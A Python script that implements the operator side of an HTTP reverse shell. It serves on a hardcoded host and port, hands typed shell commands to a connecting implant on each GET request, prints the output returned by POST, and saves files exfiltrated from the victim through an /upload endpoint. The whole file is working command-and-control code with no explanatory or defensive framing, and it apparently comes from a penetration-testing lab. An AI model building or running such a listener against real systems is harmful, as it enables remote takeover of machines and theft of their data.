import http.server
import os, cgi

hostname = "10.10.10.17"
port_number = 8080

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        command = input("Shell>")
        self.send_response(200)
        self.send_header("Content-type","text/html")
        self.end_headers()
        self.wfile.write(command.encode())
    def do_POST(self):
        if self.path == '/upload':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile,headers=self.headers,environ={'REQUEST_METHOD':'POST'})
                else:
                    print('[-] Unexpected POST request')
                fs_up = fs['file']
                with open('upload/place_holder.txt','wb') as o:
                    print('[+] Writing file ...')
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())

def main():
    server_class = http.server.HTTPServer
    httpd = server_class((hostname,port_number),MyHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[-] Server is terminated')
        httpd.server_close()
main()
